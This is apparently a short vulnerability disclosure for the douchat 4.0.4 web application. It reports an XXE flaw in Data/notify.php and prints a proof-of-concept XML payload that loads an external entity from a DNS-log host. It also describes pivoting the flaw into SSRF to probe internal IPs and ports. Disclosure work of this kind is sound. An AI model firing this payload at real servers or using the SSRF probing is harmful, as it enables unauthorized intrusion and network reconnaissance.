# douchat
## xxe
### Code analysis
Vulnerability code is located `douchat-4.0.4\Data\notify.php` 10 line.
![](https://github.com/AvaterXXX/douchat/blob/master/image/1.png)
Simplexml_load_string function can parse XML,thus forming an XXE vulnerability

### Vulnerability display
Build a POC：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://3dy5gu.ceye.io/xxe_test">
%remote;]>
<root/>
```
Used dnslog here
POST of POC
![](https://github.com/AvaterXXX/douchat/blob/master/image/2.png)
Dnslog has received the display
![](https://github.com/AvaterXXX/douchat/blob/master/image/3-1.png)

The covered place is the real IP address of the target server.
### XXE is accompanied by an SSRF vulnerability for intranet detection.For intranet detection, simply change the address to the intranet IP and port. If it is enabled, it will be displayed.
